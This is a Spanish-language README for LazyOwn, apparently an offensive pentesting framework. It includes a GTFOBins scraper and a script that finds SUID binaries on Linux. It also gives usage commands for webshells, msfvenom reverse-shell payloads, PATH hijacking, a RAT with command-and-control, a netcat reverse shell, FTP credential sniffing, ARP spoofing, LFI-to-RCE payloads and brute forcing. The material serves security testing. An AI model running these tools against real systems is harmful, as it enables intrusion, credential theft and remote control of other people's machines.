# LazyOwn
![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)


```sh
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
```

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

LazyOwn Framework es un potente y versátil framework de seguridad diseñado para automatizar y simplificar tareas de pentesting y análisis de vulnerabilidades. Este entorno interactivo combina múltiples herramientas y scripts, facilitando el trabajo de los profesionales de la ciberseguridad en diversas fases del ciclo de evaluación de seguridad. Con una interfaz de línea de comandos intuitiva, LazyOwn permite a los usuarios configurar parámetros específicos, ejecutar scripts personalizados y obtener resultados en tiempo real, todo desde una única plataforma.

Características Principales
Interfaz Interactiva:

Shell interactiva con comandos fáciles de usar para configurar y ejecutar scripts.
Capacidad para mostrar y ajustar parámetros personalizados que se aplican a diferentes scripts.
Automatización de Tareas:

Automatiza tareas comunes de pentesting, como escaneo de vulnerabilidades, fuzzing de aplicaciones web, ataques de fuerza bruta y más.
Integración con herramientas populares y scripts personalizados para una cobertura completa de pruebas.
Salida en Tiempo Real:

Visualización en tiempo real de la salida de los scripts, permitiendo a los usuarios ver los resultados instantáneamente y reaccionar rápidamente.
Modularidad y Extensibilidad:

Diseñado para ser extensible, permitiendo a los usuarios añadir y personalizar scripts fácilmente.
Soporte para múltiples lenguajes de scripting, incluyendo Python y Bash.
Configuración Flexible:

Posibilidad de establecer parámetros específicos como direcciones IP, claves API, métodos HTTP, datos de solicitud, y más, proporcionando un control total sobre los scripts ejecutados.
Uso Típico
Configuración de Parámetros:

Los usuarios pueden establecer parámetros necesarios usando comandos set, como set target_ip 192.168.1.1 para definir la IP del objetivo.
Ejecución de Scripts:

Ejecución de scripts predefinidos para realizar diversas tareas, por ejemplo, run lazygptcli para interactuar con GPT usando un prompt y una clave API configurados.
Visualización de Resultados:

Los resultados de los scripts se muestran en la consola en tiempo real, proporcionando feedback inmediato sobre el progreso y los hallazgos.

LazyOwn es un proyecto que partio diseñado para automatizar la búsqueda y análisis de binarios con permisos especiales en sistemas Linux y Windows. El proyecto consta de tres scripts principales que extraen información de [GTFOBins](https://gtfobins.github.io/), analizan los binarios en el sistema y generan opciones basadas en la información recopilada.

https://www.reddit.com/r/LazyOwn/

Revolutionize Your Pentesting with LazyOwn: Automate Binary Analysis on Linux and Windows

https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a

Discover LazyOwn, the ultimate solution for automating the search and analysis of binaries with special permissions on both Linux and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.
```sh
LazyOwn> set target_ip 192.168.1.1
[SET] target_ip set to 192.168.1.1
LazyOwn> run lazynmap
[INFO] Running Nmap scan on 192.168.1.1
...
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7)

LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solución centralizada y automatizada para sus necesidades de pentesting, ahorrando tiempo y mejorando la eficiencia en la identificación y explotación de vulnerabilidades.

![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)

## Requisitos

- Python 3.x
- Módulos de Python:
  - `requests`
  - `beautifulsoup4`
  - `pandas`
- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
- 
## Instalación

1. Clona el repositorio:

```sh
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
```
2. Instala las dependencias de Python:
```sh
pip install requeriments.txt
```
## Uso

```sh
python3 lazyown # or just ./lazyown
```
```
Use set <parameter> <value> to set parameters.
Use show to display current parameter values.
Use run <script_name> to execute a script with the set parameters.
Use exit to exit the CLI.
Una vez que el shell esté en funcionamiento, puedes utilizar los siguientes comandos:

list: Lista todos los Modulos de LazyOwn
set <parámetro> <valor>: Establece el valor de un parámetro. Por ejemplo, set target_ip 192.168.1.1.
show: Muestra los valores actuales de todos los parámetros.
run <script>: Ejecuta un script específico disponible en el framework.
Scripts disponibles
lazysearch: Ejecuta el script de búsqueda perezosa para buscar archivos binarios en el sistema.
lazysearch_gui: Ejecuta el script LazySearch con una interfaz gráfica.
lazyown: Inicia un script principal de LazyOwn para realizar diversas tareas.
update_db: Actualiza la base de datos de LazyOwn.
lazynmap: Realiza un escaneo de puertos utilizando Nmap.
lazynmapdiscovery: Realiza un escaneo a toda la red utilizando Nmap.
lazygptcli: Inicia un cliente de línea de comandos para groq llama model.
lazyburpfuzzer: Ejecuta un escáner de vulnerabilidades en una URL específica utilizando Burp Suite.
lazyreverse_shell: Inicia un shell inverso en el sistema objetivo.
lazyattack: Inicia un ataque utilizando varios modos.
```
```sh
LazyOwn> set binary_name my_binary
LazyOwn> set target_ip 192.168.1.100
LazyOwn> set api_key my_api_key
LazyOwn> run lazysearch
LazyOwn> run lazynmap
LazyOwn> exit
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)

para las busquedas 
```sh
python3 lazysearch.py binario_a_buscar
```
## Busquedas con GUI

Características adicionales y cambios:
AutocompleteEntry:

Se ha agregado un filtro para eliminar valores None de la lista de autocompletar.
Nuevo Vector de Ataque:

Añadido un botón "Nuevo Vector de Ataque" en la interfaz principal.
Implementada la funcionalidad para agregar un nuevo vector de ataque y guardar los datos actualizados en los archivos Parquet.
Exportar a CSV:

Añadido un botón "Exportar a CSV" en la interfaz principal.
Implementada la funcionalidad para exportar los datos del DataFrame a un archivo CSV seleccionado por el usuario.
Uso:
Agregar un nuevo vector de ataque: Hacer clic en el botón "Nuevo Vector de Ataque", llenar los campos y guardar.
Exportar a CSV: Hacer clic en el botón "Exportar a CSV" y seleccionar la ubicación para guardar el archivo CSV.

Nueva Función scan_system_for_binaries:

Implementa la búsqueda de binarios en el sistema utilizando el comando file para determinar si un archivo es binario.
Se utiliza os.walk para recorrer el sistema de archivos.
Los resultados se muestran en una nueva ventana de la GUI.
Botón para Buscar Binarios:

Se ha añadido un botón "Buscar Binarios en el Sistema" en la interfaz principal que llama a la función scan_system_for_binaries.
Nota:
La función is_binary utiliza el comando file de Unix para determinar si un archivo es un ejecutable binario. Si estás en un sistema operativo diferente, necesitarás ajustar este método para que sea compatible.
Esta implementación puede ser intensiva en recursos, ya que recorre todo el sistema de archivos. Podrías añadir opciones adicionales para limitar la búsqueda a directorios específicos o añadir un filtro para ciertos tipos de archivos.

```sh
python3 LazyOwnExplorer.py
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)


para ejecutar una busqueda contra la maquina a analizar 
```sh
python3 lazyown.py
```


en el caso de querer actualizar hacemos

```sh
cd LazyOwn
rm *.csv
rm *.parquet
./update_db.sh
```
El proyecto consta de tres scripts principales:

1. search.py
Este script extrae información de binarios y sus funciones desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así que mejor evitar y usar la db que ya tiene en formato csv, a menos que quieran actualizar la db
```python
import requests
from bs4 import BeautifulSoup
import csv

# URL del servidor que contiene el HTML
url = "https://gtfobins.github.io/index.html"

# Hacer una solicitud GET al servidor
response = requests.get(url)

# Verificar si la solicitud fue exitosa
if response.status_code == 200:
    html_content = response.text
else:
    print("Error al obtener el HTML del servidor")
    exit()

# Parsear el contenido HTML con Beautiful Soup
soup = BeautifulSoup(html_content, 'html.parser')

# Encontrar el contenedor de la tabla
table_wrapper = soup.find('div', id='bin-table-wrapper')

# Inicializar una lista para almacenar la información
data = []

# Recorrer todas las filas de la tabla
for row in table_wrapper.find_all('tr'):
    bin_name = row.find('a', class_='bin-name')
    if bin_name:
        bin_name_text = bin_name.text.strip()
        functions = []
        for func in row.find_all('li'):
            function_link = func.find('a')
            if function_link:
                function_href = function_link.get('href').strip()
                function_name = function_link.text.strip()
                functions.append({'name': function_name, 'href': function_href})
        
        # Añadir la información a la lista de datos
        data.append({'binary': bin_name_text, 'functions': functions})

# Guardar la información en un archivo CSV
csv_file = "bin_data.csv"
with open(csv_file, mode='w', newline='') as file:
    writer = csv.writer(file)
    writer.writerow(['Binary', 'Function Name', 'Function URL'])
    for entry in data:
        binary = entry['binary']
        for func in entry['functions']:
            writer.writerow([binary, func['name'], func['href']])

print(f"Datos guardados en {csv_file}")

```

## 2. detailed_search.py
Este script lee el archivo CSV generado por scrape_bins.py, extrae detalles adicionales de cada función y guarda los datos en un segundo archivo CSV.

```python
import requests
from bs4 import BeautifulSoup
import csv
from urllib.parse import urljoin
import time
import os

# URL base del servidor
base_url = "https://gtfobins.github.io/"

# Nombre del archivo CSV de entrada
input_csv = "bin_data.csv"

# Nombre del archivo de salida CSV
output_csv = "bin_data_relevant.csv"

# Función para obtener la información relevante de una URL
def obtener_informacion(url):
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Error al obtener la URL: {url}")
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    data = []

    for section in soup.find_all('h2', class_='function-name'):
        function_name = section.text.strip()
        function_id = section.get('id')
        function_url = f"{url}#{function_id}"
        description = section.find_next('p').text.strip() if section.find_next('p') else ""
        example = section.find_next('code').text.strip() if section.find_next('code') else ""

        data.append({
            "function_name": function_name,
            "function_url": function_url,
            "description": description,
            "example": example
        })

    return data

# Leer el archivo CSV de entrada
binarios_funciones = {}
with open(input_csv, mode='r', encoding='utf-8') as file:
    reader = csv.DictReader(file)
    for row in reader:
        binary = row['Binary']
        if binary not in binarios_funciones:
            binarios_funciones[binary] = row['Function URL'].split('#')[0]

# Verificar si ya existe un archivo de salida y hasta dónde se ha procesado
resume = False
if os.path.exists(output_csv):
    with open(output_csv, mode='r', encoding='utf-8') as file:
        reader = csv.reader(file)
        rows = list(reader)
        if len(rows) > 1:
            last_processed = rows[-1][2]
            resume = True

# Inicializar una lista para almacenar toda la información
informacion_binarios = []

# Abrir el archivo CSV para escritura
csv_file = open(output_csv, mode='w', newline='', encoding='utf-8')
csv_writer = csv.writer(csv_file)
csv_writer.writerow(['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])

# Recorrer la lista de binarios y sus funciones
for binary, url in binarios_funciones.items():
    # Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado
    if resume:
        if url != last_processed:
            continue
        else:
            resume = False
    full_url = urljoin(base_url, url)
    
    informacion = obtener_informacion(full_url)
    for item in informacion:
        informacion_binarios.append({
            "binary": binary,
            "function_name": item["function_name"],
            "function_url": item["function_url"],
            "description": item["description"],
            "example": item["example"]
        })
        # Guardar la información en el archivo CSV
        csv_writer.writerow([binary, item['function_name'], item['function_url'], item['description'], item['example']])
        print(f"[+] Binary: {binary} {item['function_name']}")
    # Hacemos una pausa de 5 segundos entre cada solicitud de URL
    time.sleep(5)

# Cerrar el archivo CSV
csv_file.close()

print(f"Datos guardados en {output_csv}")

```

3. lazyown.py
Este script analiza los binarios en el sistema y genera opciones basadas en la información recopilada. Detecta si el sistema operativo es Linux o Windows y ejecuta el comando adecuado para buscar binarios con permisos elevados.

```python
import pandas as pd
import os
import subprocess
import platform

# Lee los CSVs y crea los DataFrames
df1 = pd.read_csv('bin_data.csv')
df2 = pd.read_csv('bin_data_relevant.csv')

# Guarda los DataFrames como Parquet
df1.to_parquet('binarios.parquet')
df2.to_parquet('detalles.parquet')

# Función para realizar la búsqueda y generar el CSV de salida
def buscar_binarios():
    binarios_encontrados = set()
    
    # Detecta el sistema operativo
    sistema_operativo = platform.system()
    
    if sistema_operativo == 'Linux':
        # Ejecuta el comando find para Linux
        result = subprocess.run(['find', '/', '-perm', '4000', '-ls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.split()[-1])
                binarios_encontrados.add(binario)
    
    elif sistema_operativo == 'Windows':
        # Script de PowerShell para Windows
        powershell_script = """
        $directories = @("C:\\Windows\\System32", "C:\\", "C:\\Program Files", "C:\\Program Files (x86)")
        foreach ($dir in $directories) {
            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | 
            ForEach-Object {
                $acl = Get-Acl $_.FullName
                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match "FullControl" }
                if ($privileges) {
                    Write-Output "$($_.FullName)"
                }
            }
        }
        """
        
        # Ejecuta el script de PowerShell
        result = subprocess.run(['powershell', '-Command', powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.strip())
                binarios_encontrados.add(binario)
    
    # Filtra el DataFrame principal con los binarios encontrados
    df_binarios_encontrados = df1[df1['Binary'].isin(binarios_encontrados)]
    
    # Genera un CSV con los detalles de los binarios encontrados
    with open('resultado.csv', 'w') as f:
        for binario in binarios_encontrados:
            detalles = df2[df2['Binary'] == binario]
            if not detalles.empty:
                f.write(detalles.to_csv(index=False, header=False))
                print(detalles.to_csv(index=False, header=False))

# Función para ejecutar opciones basadas en los datos encontrados
def ejecutar_opciones():
    df_resultado = pd.read_csv('resultado.csv', header=None, names=['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])
    
    for binario in df_resultado['Binary'].unique():
        print(f"Binario encontrado: {binario}")
        detalles = df_resultado[df_resultado['Binary'] == binario]

        print("Opciones:")
        for i, (_, row) in enumerate(detalles.iterrows(), start=1):
            print(f"{i}. {row['Function Name']} - {row['Description']}")
        print(f"{i+1}. No hacer nada y salir")
        
        while True:
            opcion = input("Seleccione una opción: ")
            if opcion.isdigit() and 1 <= int(opcion) <= len(detalles) + 1:
                break
            else:
                print("Opción no válida. Por favor, intente de nuevo.")
        
        opcion = int(opcion)
        
        if opcion <= len(detalles):
            print(f"Ejecutando opción {opcion} para {binario}")
            # Código para ejecutar la opción correspondiente
            print(f"Ejemplo de ejecución:\n{detalles.iloc[opcion-1]['Example']}")
            # Aquí puedes agregar el código para ejecutar el ejemplo si es necesario
        else:
            print("Saliendo")
            break

if __name__ == '__main__':
    buscar_binarios()
    ejecutar_opciones()

```
## Uso modo LazyOwn WebShells
LazyOwn Webshell Collection es una colleccion de webshells para nuestro framework, el cual nos permite mediante distintos lenguajes establecer una webshell en la maquina donde ejecutemos lazyown webshell basicamente lo que hace es levantar un servidor web dentro del directorio modules para que así esté visible mediante el navegador así podemos tanto disponivilizar los modulos por separados mediante web como tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una bash otra en perl otra en python y en asp por 
si fuera un windwos

```sh
lazywebshell
```

y listo ya podemos acceder a cualquiera de estas url:

http://localhost:8080/cgi-bin/lazywebshell.sh

http://localhost:8080/cgi-bin/lazywebshell.py

http://localhost:8080/cgi-bin/lazywebshell.asp

http://localhost:8080/cgi-bin/lazywebshell.cgi


![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)

## Uso Lazy MSFVenom para Reverse Shell
se crearán 3 archivos uno para windows uno para linux y uno para mac con el nombre shell.exe, shell.elf, shell.macho respectivamente y se invoca con el comando run lazymsfvenom

```sh
run lazymsfvenom
```
## Uso Lazy PATH Hijacking
se crearán un archivo en /tmp con el nombre de binary_name seteado en payload inicializado con gzip en memoria y como bash en payload parasetear el payload desde el json usar el comando payload para ejecutar usar:

```sh
lazypathhijacking
```
## Uso modo LazyOwn RAT
LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con una funcion de Screenshot, el cual captura la pantalla del servidor, tiene un comando upload, el cual nos permite subir archivos a la maquina comprometida, y un modo C&C donde podran enviar comandos al servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene ningun tipo de ofuscación y la rat me base en BasicRat acá su github https://github.com/awesome-security/basicRAT y en https://github.com/hash3liZer/SillyRAT aun que está ultima es mucho más completa yo solo queria sacar pantallasos subir archivos y enviar comandos, quizas más adelante agregar funcionalidad de mirar webcams, pero eso más adelante.

```sh
usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
lazyownserver.py: error: the following arguments are required: --key

usage: lazyownclient.py [-h] --host HOST --port PORT --key KEY
lazyownclient.py: error: the following arguments are required: --host, --port, --key

LazyOwn> run lazyownclient
[?] lhost and lport and rat_key must be set

LazyOwn> run lazyownserver
[?] rhost and lport and rat_key must be set

luego los comandos son:

upload /path/to/file
donwload /path/to/file
screenshot
sysinfo
fix_xauth #to fix xauth xD
lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)


## Uso modo Lazy Meta Extract0r
LazyMeta Extract0r es una herramienta diseñada para extraer metadata de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta herramienta recorrerá un directorio especificado, buscará archivos con extensiones compatibles, extraerá la metadata y la guardará en un archivo de salida.


[*] Iniciando: LazyMeta extract0r [;,;]

usage: lazyown_metaextract0r.py [-h] --path PATH
lazyown_metaextract0r.py: error: the following arguments are required: --path

```sh
python3 lazyown_metaextract0r.py --path /home/user
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)

## Uso modo decrypt encrypt
un metodo de cifrado el cual nos permite tanto encryptar archivos como decencriptar los si se cuenta con la llave obviamente:

![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)

```sh
encrypt path/to/file key # to encrypt
decrypt path/to/file.enc key #to decrypt
```

## Uso modo LazyNmap

El uso Lazynmap nos proporciona un script automatizado de un target en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de administración mediante sudo.
tambien tiene un modulo de net discovery para saber que hay en el segmento de ip en el que te encuentras. 

![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)

```sh
./lazynmap.sh -t 127.0.0.1 
```
## Uso modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y researcher

¡Descubre la revolución en automatización de tareas de pentesting con el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida como pentester más eficiente y productiva.

🚀 Principales Características:

Automatización Inteligente: Utiliza la potencia de Groq y modelos avanzados de lenguaje natural para generar comandos precisos y eficientes basados en tus necesidades específicas.
Interfaz Amigable: Con un simple prompt, el asistente genera y ejecuta scripts de una línea, reduciendo drásticamente el tiempo y esfuerzo en la creación de comandos complejos.
Mejora Continua: Transforma y optimiza continuamente su base de conocimientos para proporcionarte las mejores soluciones, adaptándose a cada situación.
Depuración Simplificada: Habilita el modo debug para obtener información detallada de cada paso, facilitando la identificación y corrección de errores.
Integración Perfecta: Funciona sin problemas con tu entorno de trabajo, aprovechando el poder de la API de Groq para ofrecerte respuestas rápidas y precisas.

🔒 Seguridad y Control:

Manejo Seguro de Errores: Detecta y responde inteligentemente a errores de ejecución, asegurando que siempre tengas el control total de cada comando generado.
Ejecución Controlada: Antes de ejecutar cualquier comando, solicita tu confirmación, brindándote la tranquilidad de saber exactamente qué se está ejecutando en tu sistema.

🌐 Configuración Sencilla:

Configura tu API key en segundos y comienza a disfrutar de todas las ventajas que ofrece el LazyOwn GPT One Liner CLI Assistant.
La guía de inicio rápido está disponible para ayudarte a configurar y sacar el máximo provecho de esta poderosa herramienta.

🎯 Ideal para Pentesters y Desarrolladores:

Optimiza tus Procesos: Simplifica y acelera la generación de comandos en tus auditorías de seguridad.
Aprendizaje Continuo: La base de conocimientos se actualiza y mejora constantemente, proporcionándote siempre las mejores prácticas y soluciones más recientes.
Con el LazyOwn GPT One Liner CLI Assistant, transforma tu forma de trabajar, haciéndola más rápida, eficiente y segura. ¡No pierdas más tiempo en tareas repetitivas y complejas, y enfócate en lo que realmente importa: descubrir y solucionar vulnerabilidades!

¡Únete a la revolución del pentesting con LazyOwn y lleva tu productividad al siguiente nivel!

[?] Uso: python lazygptcli.py --prompt "<tu prompt>" [--debug]

[?] Opciones:
  --prompt    "El prompt para la tarea de programación (requerido)."
  --debug, -d "Habilita el modo debug para mostrar mensajes de depuración."
  --transform "Transforma la base de conocimientos original en una base mejorada usando Groq."

[?] Asegúrate de configurar tu API key antes de ejecutar el script:
  export GROQ_API_KEY=<tu_api_key>
[->] visit: https://console.groq.com/docs/quickstart not sponsored link

Requisitos:
Python 3.x
Una API key válida de Groq
Pasos para Obtener la API Key de Groq:
Visita Groq Console (https://console.groq.com/docs/quickstart) para registrarte y obtener una API key.


```sh
export GROQ_API_KEY=<tu_api_key>
python3 lazygptcli.py --prompt "<tu prompt>" [--debug]          
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)

## Uso de modo lazyown_bprfuzzer.py
Proporcionar los argumentos según las solicitudes del script: El script solicitará los siguientes argumentos:
usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                   [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]
                   
lazyburp.py: error: the following arguments are required: --url
--url: La URL a la que se enviará la solicitud (obligatorio).
--method: El método HTTP a utilizar, como GET o POST (opcional, valor predeterminado: GET).
--headers: Los encabezados de la solicitud en formato JSON (opcional, valor predeterminado: {}).
--params: Los parámetros de la URL en formato JSON (opcional, valor predeterminado: {}).
--data: Los datos del formulario en formato JSON (opcional, valor predeterminado: {}).
--json_data: Los datos JSON para la solicitud en formato JSON (opcional, valor predeterminado: {}).
--proxy_port: El puerto del proxy interno (opcional, valor predeterminado: 8080).
-w, --wordlist: La ruta del diccionario para el modo de fuzzing (opcional).
-hc, --hide_code: El código de estado HTTP para ocultar en la salida (opcional).

```sh
python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
```

Forma 2: Uso Avanzado
Si deseas aprovechar las características avanzadas del script, como el modo de repetición o fuzzing, sigue estos pasos:

Repetición de solicitudes:

Para utilizar la funcionalidad de repetición de solicitudes, proporciona los argumentos como se indicó anteriormente.
Durante la ejecución, el script preguntará si deseas repetir la solicitud. Ingresa 's' para repetir o 'n' para finalizar el repetidor.
Fuzzing:

Para usar la funcionalidad de fuzzing, asegúrate de proporcionar un diccionario de palabras con el argumento -w o --wordlist.
El script reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palabras del diccionario proporcionado.
Durante la ejecución, el script mostrará los resultados de cada iteración de fuzzing.
Estas son las formas básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus necesidades, puedes elegir la forma que mejor se adapte a tu situación específica.


```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
    -hc 501
```

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
 
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
PD: para usar el diccionario que utilizo realizar dentro de /usr/share/seclist el siguiente comando
```sh
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
&& unzip SecList.zip \
&& rm -f SecList.zip
```

## Uso modo LazyOwn FTP Sniff 
este modulo sirve para buscar claves en la red de servidores ftp, algunos me dirán que no se ya no se usa pero se sorprenderian en los entornos productivos en infraestructura critica que e visto maquinas con FTP's masivos corriendo en sus servidores :)

```sh
set device eth0
run lazyftpsniff
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)


## Uso modo LazyReverseShell
primero nos ponemos en escucha con el comando 


```sh
nc -nlvp 1337 #o el puerto que escojamos 
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)

para luego en la maquina victima 
```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```
![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)

## Uso modo Lazy Curl to recon
el modulo está en modules y se usa así:

```sh
chmod +x lazycurl.sh
```
Ejecutar el script con los parámetros deseados. Por ejemplo:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```
Ejemplos de uso

Enviar una solicitud GET:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Enviar una solicitud POST:

```sh
./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
```

Probar un método TRACE:

```sh
./lazycurl.sh --mode TRACE --url http://10.10.10.10
```sh

Subir un archivo:

```sh
./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
```

Realizar fuerza bruta con una wordlist:

```sh
./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
```

Asegúrate de ajustar los parámetros según tus necesidades y de que los valores que pases a las opciones sean válidos para cada caso.

## Uso modo ARPSpoofing
el script provee de un ataque de ARPSpoofing mediante scapy en el payload debe ser seteado el lhost rhost y el device que pondràs a arpspoofear 

```sh
set rhost 192.168.1.100
set lhost 192.168.1.1
set device eth0
run lazyarpspoofing
```

## Uso modo LazyGathering
script que nos provee una visión de rayos x en cuanto al sistema en cuestion donde estamos ejecutando la herramiente

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)

```sh
run lazygath
```
## Uso modo Lazy Own Lfi Rfi 2 Rce

El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a los parametros de payload.json

![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)


```sh
payload
run lazylfi2rce
```

## Uso modo LazyOwn Sniffer

https://www.youtube.com/watch?v=_-DDiiMrIlE

El modo sniffer nos permite capturar el trafico de red por interfaces con la opcion -i que es la opción obligatoria, dentro de muchas tras opciones no obligatorias,
usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
lazysniff.py: error: the following arguments are required: -i/--interface

![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)

usando desde el framework se debe setear device con set device [eth0, wla0,eth1, wlan1, etc] segun sea su interface y luego: 
```sh
run lazysniff
```
## Uso modo LazyAtack
Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.

Opciones del Script
Modo Servidor:

Ejecuta en la máquina víctima.
Ofrece opciones como iniciar un servidor HTTP, configurar netcat para escuchar conexiones, enviar archivos mediante netcat, configurar una shell reversa, entre otros.
Modo Cliente:

Ejecuta en la máquina atacante.
Ofrece opciones como descargar listas de SecLists, escanear puertos, enumerar servicios HTTP, verificar conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
Ejemplos de Uso
Uso Básico


```sh
./lazyatack.sh --modo servidor --ip 192.168.1.1 --atacante 192.168.1.100
```

```sh
./lazyatack.sh --modo cliente --url http://victima.com --ip 192.168.1.10
```
Esto ejecuta el script en modo cliente, configurando la URL de la víctima como http://victima.com y la IP de la víctima como 192.168.1.10.

## Funciones del Script

```
Funciones del Script
Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
Configurar Netcat: Configura netcat para escuchar en el puerto 443.
